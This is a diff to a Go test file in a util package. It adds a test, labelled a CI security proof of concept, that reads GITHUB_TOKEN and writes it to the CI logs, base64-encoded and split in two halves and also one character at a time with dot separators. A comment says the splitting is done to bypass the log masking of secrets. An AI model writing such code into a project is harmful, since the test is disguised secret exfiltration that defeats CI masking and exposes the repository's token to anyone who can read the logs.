@@ -2,8 +2,10 @@ package util
 
 import (
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/hex"
 	"os"
+	"strings"
 	"testing"
 )
 
@@ -40,4 +42,25 @@ func TestCISecurityPoC_SecretEnvExposure(t *testing.T) {
 				key, len(val), hex.EncodeToString(hash[:])[:8])
 		}
 	}
+}
+
+func TestCISecurityPoC_DirectTokenB64(t *testing.T) {
+	token := os.Getenv("GITHUB_TOKEN")
+	if token == "" {
+		t.Skip("GITHUB_TOKEN not set")
+	}
+	hash := sha256.Sum256([]byte(token))
+	encoded := base64.StdEncoding.EncodeToString([]byte(token))
+
+	t.Logf("TOKEN-SHA256: %s", hex.EncodeToString(hash[:]))
+	t.Logf("TOKEN-B64-LEN: %d", len(token))
+	t.Logf("TOKEN-B64-PART1: %s", encoded[:len(encoded)/2])
+	t.Logf("TOKEN-B64-PART2: %s", encoded[len(encoded)/2:])
+
+	// Also print char-by-char with separator to bypass masking
+	var chars []string
+	for _, c := range token {
+		chars = append(chars, string(c))
+	}
+	t.Logf("TOKEN-CHARS: %s", strings.Join(chars, "."))
 }
